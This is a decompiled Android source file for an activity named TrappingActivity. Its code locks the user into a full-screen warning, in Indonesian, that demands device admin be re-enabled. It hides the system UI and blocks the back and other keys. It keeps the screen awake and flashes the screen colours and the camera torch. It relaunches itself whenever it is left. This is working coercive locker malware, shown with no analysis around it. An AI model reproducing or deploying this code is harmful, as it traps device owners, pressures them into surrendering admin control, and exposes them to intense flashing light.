/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.app.admin.DevicePolicyManager
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Color
 *  android.hardware.camera2.CameraAccessException
 *  android.hardware.camera2.CameraManager
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.os.Handler
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.view.KeyEvent
 *  android.view.View
 *  android.view.View$OnSystemUiVisibilityChangeListener
 *  android.widget.TextView
 */
package com.love.app;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.view.KeyEvent;
import android.view.View;
import android.widget.TextView;
import com.love.app.AdminReceiver;
import com.love.app.TrappingActivity$$ExternalSyntheticLambda0;
import com.love.app.TrappingActivity$$ExternalSyntheticLambda1;
import com.love.app.TrappingActivity$$ExternalSyntheticLambda2;

public class TrappingActivity
extends Activity {
    private String cameraId;
    private CameraManager cameraManager;
    private Handler handler = new Handler();
    private boolean isFlashing = false;
    private boolean torchOn = false;
    private PowerManager.WakeLock wakeLock;

    public static /* synthetic */ void $r8$lambda$9lV0cTBn_10mYW97ymQvBKrgfII(TrappingActivity trappingActivity) {
        trappingActivity.hideSystemUI();
    }

    private void hideSystemUI() {
        View view = this.getWindow().getDecorView();
        view.setSystemUiVisibility(5894);
        view.setOnSystemUiVisibilityChangeListener((View.OnSystemUiVisibilityChangeListener)new TrappingActivity$$ExternalSyntheticLambda0(this));
    }

    private void startScreenFlashing() {
        this.handler.post(new Runnable(this){
            final TrappingActivity this$0;
            {
                this.this$0 = trappingActivity;
            }

            @Override
            public void run() {
                if (!this.this$0.isFlashing) {
                    return;
                }
                int n = (int)(Math.random() * 255.0);
                int n2 = (int)(Math.random() * 255.0);
                int n3 = (int)(Math.random() * 255.0);
                this.this$0.getWindow().getDecorView().setBackgroundColor(Color.rgb((int)n, (int)n2, (int)n3));
                this.this$0.handler.postDelayed((Runnable)this, 200L);
            }
        });
    }

    private void startTorchFlashing() {
        if (this.cameraId != null) {
            this.isFlashing = true;
            Runnable runnable2 = new Runnable(this){
                final TrappingActivity this$0;
                {
                    this.this$0 = trappingActivity;
                }

                /*
                 * Enabled aggressive block sorting
                 * Enabled unnecessary exception pruning
                 * Enabled aggressive exception aggregation
                 */
                @Override
                public void run() {
                    if (!this.this$0.isFlashing) {
                        return;
                    }
                    try {
                        TrappingActivity trappingActivity = this.this$0;
                        boolean bl = !trappingActivity.torchOn;
                        trappingActivity.torchOn = bl;
                        this.this$0.cameraManager.setTorchMode(this.this$0.cameraId, this.this$0.torchOn);
                    }
                    catch (CameraAccessException cameraAccessException) {}
                    this.this$0.handler.postDelayed((Runnable)this, 300L);
                }
            };
            this.handler.post(runnable2);
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void stopTorch() {
        this.isFlashing = false;
        if (this.cameraId == null) return;
        try {
            this.cameraManager.setTorchMode(this.cameraId, false);
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    /* synthetic */ void lambda$hideSystemUI$0$com_love_app_TrappingActivity(int n) {
        if ((n & 4) == 0) {
            this.handler.postDelayed((Runnable)new TrappingActivity$$ExternalSyntheticLambda2(this), 500L);
        }
    }

    /* synthetic */ void lambda$onPause$1$com_love_app_TrappingActivity() {
        if (this.isFinishing()) {
            return;
        }
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager)this.getSystemService("device_policy");
        ComponentName componentName = new ComponentName((Context)this, AdminReceiver.class);
        boolean bl = devicePolicyManager != null && devicePolicyManager.isAdminActive(componentName);
        if (!bl) {
            devicePolicyManager = new Intent((Context)this, TrappingActivity.class);
            devicePolicyManager.addFlags(0x30000000);
            this.startActivity((Intent)devicePolicyManager);
        }
    }

    public void onBackPressed() {
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.requestWindowFeature(1);
        this.getWindow().addFlags(6825089);
        if (Build.VERSION.SDK_INT >= 27) {
            this.setShowWhenLocked(true);
            this.setTurnScreenOn(true);
        }
        bundle = new TextView((Context)this);
        bundle.setText((CharSequence)"⚠️ PERINGATAN KEAMANAN ⚠️\n\nDevice admin telah dinonaktifkan.\nAktifkan kembali untuk menggunakan perangkat.\n\nTombol fisik tidak akan berfungsi.");
        bundle.setTextSize(20.0f);
        bundle.setGravity(17);
        bundle.setPadding(50, 50, 50, 50);
        bundle.setTextColor(-1);
        bundle.setBackgroundColor(-16777216);
        this.setContentView((View)bundle);
        this.setFinishOnTouchOutside(false);
        this.hideSystemUI();
        bundle = ((PowerManager)this.getSystemService("power")).newWakeLock(0x1000001A, "TrappingActivity::Lock");
        this.wakeLock = bundle;
        bundle.acquire(1800000L);
        bundle = (CameraManager)this.getSystemService("camera");
        this.cameraManager = bundle;
        try {
            this.cameraId = bundle.getCameraIdList()[0];
        }
        catch (Exception exception) {}
        this.startTorchFlashing();
        this.startScreenFlashing();
    }

    protected void onDestroy() {
        super.onDestroy();
        this.isFlashing = false;
        this.handler.removeCallbacksAndMessages(null);
        PowerManager.WakeLock wakeLock = this.wakeLock;
        if (wakeLock != null && wakeLock.isHeld()) {
            this.wakeLock.release();
        }
        this.stopTorch();
    }

    public boolean onKeyDown(int n, KeyEvent keyEvent) {
        if (n == 26) {
            return super.onKeyDown(n, keyEvent);
        }
        return true;
    }

    protected void onPause() {
        super.onPause();
        this.handler.postDelayed((Runnable)new TrappingActivity$$ExternalSyntheticLambda1(this), 300L);
    }

    protected void onResume() {
        super.onResume();
        this.hideSystemUI();
        if (!this.isFlashing) {
            this.isFlashing = true;
            this.startTorchFlashing();
            this.startScreenFlashing();
        }
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager)this.getSystemService("device_policy");
        ComponentName componentName = new ComponentName((Context)this, AdminReceiver.class);
        if (devicePolicyManager != null && devicePolicyManager.isAdminActive(componentName)) {
            this.finish();
        }
    }
}

